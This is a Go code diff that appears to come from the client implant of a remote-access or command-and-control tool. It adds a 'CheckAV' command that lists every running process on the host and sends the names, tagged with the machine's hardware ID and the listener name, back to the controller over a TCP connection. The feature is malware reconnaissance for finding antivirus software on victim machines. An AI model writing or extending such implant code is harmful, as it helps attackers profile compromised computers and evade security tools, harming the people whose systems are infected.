@@ -16,6 +16,8 @@ import (
 	"path/filepath"
 	"strconv"
 	"strings"
+
+	"github.com/shirou/gopsutil/process"
 )
 
 var ProcessPath string
@@ -85,6 +87,39 @@ func Read(Data []byte, Connection net.Conn) {
 			GetCurrentPath(Connection, *unmsgpack)
 		}
 
+	case "CheckAV":
+		{
+			processList, err := process.Processes()
+			if err != nil {
+				fmt.Printf("Error fetching processes: %s\n", err)
+				return
+			}
+
+			var stringBuilder strings.Builder
+			for _, proc := range processList {
+				name, err := proc.Name()
+				if err != nil {
+					continue // 在这里，我们简单地跳过任何错误
+				}
+				stringBuilder.WriteString(name + "-=>")
+			}
+			fmt.Println(stringBuilder.String())
+			result := ""
+			result = string(stringBuilder.String())
+			utf8Stdout, err := Helper.ConvertGBKToUTF8(result)
+			if err != nil {
+				//Log(err.Error(), Connection, *unmsgpack)
+				utf8Stdout = err.Error()
+			}
+			msgpack := new(MessagePack.MsgPack)
+			msgpack.ForcePathObject("Pac_ket").SetAsString("BackSession")
+			msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
+			msgpack.ForcePathObject("Domain").SetAsString("CheckAVInfo")
+			msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
+			msgpack.ForcePathObject("ProcessIDClientHWID").SetAsString(PcInfo.GetProcessID() + PcInfo.GetHWID())
+			msgpack.ForcePathObject("ProcessInfo").SetAsString(utf8Stdout)
+			TCPsocket.Send(Connection, msgpack.Encode2Bytes())
+		}
 	case "getPath":
 		{
 
